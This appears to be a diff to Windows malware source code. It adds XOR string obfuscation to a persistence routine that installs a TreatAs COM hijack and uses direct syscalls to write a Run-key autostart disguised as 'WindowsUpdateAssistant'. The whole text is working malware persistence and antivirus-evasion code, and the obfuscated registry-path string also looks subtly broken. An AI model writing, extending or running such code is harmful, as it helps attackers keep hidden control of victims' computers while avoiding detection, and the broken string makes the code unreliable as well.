@@ -2,6 +2,7 @@
 #include "ComHijacker.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
+#include "../utils/Obfuscator.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
 #include <windows.h>
@@ -134,10 +135,11 @@ bool establishPersistence() {
         CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
     }
 
-    // Stealthy COM Hijack: Folder Background menu
-    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
+    // Stealthy COM Hijack via TreatAs redirection
+    // Victim: {3AD05575-8854-4856-A25F-3627763307B2}
+    std::wstring clsid = L"{3AD05575-8854-4856-A25F-3627763307B2}";
 
-    LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
+    LOG_INFO("Attempting TreatAs COM Hijack for " + utils::ws2s(clsid));
     bool comSuccess = ComHijacker::Install(persistPath, clsid);
     if (comSuccess) {
         LOG_INFO("COM Hijack installed successfully.");
@@ -173,14 +175,16 @@ bool establishPersistence() {
         NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
         if (NT_SUCCESS(status)) {
-            std::wstring relativePath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+            // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            std::wstring runKeyPath = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x0d\x33\x34\x3e\x35\x2d\x29\x00\x19\x2f\x28\x28\x3f\x34\x2e\x1c\x3f\x28\x29\x33\x35\x34\x00\x08\x2f\x34", 43);
             HANDLE hRunKey = NULL;
-            status = utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hRunKey);
+            status = utils::Shared::NtCreateKeyRelative(hHkcu, runKeyPath, &hRunKey);
 
             InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
             if (NT_SUCCESS(status)) {
-                std::wstring valName = L"WindowsUpdateAssistant";
+                // "WindowsUpdateAssistant"
+                std::wstring valName = utils::xor_wstr(L"\x0d\x33\x34\x3e\x35\x2d\x29\x0f\x2a\x3e\x3b\x2e\x3f\x1b\x29\x29\x33\x29\x2e\x3b\x34\x2e", 22);
                 UNICODE_STRING uValName;
                 uValName.Buffer = (PWSTR)valName.c_str();
                 uValName.Length = (USHORT)(valName.length() * sizeof(wchar_t));
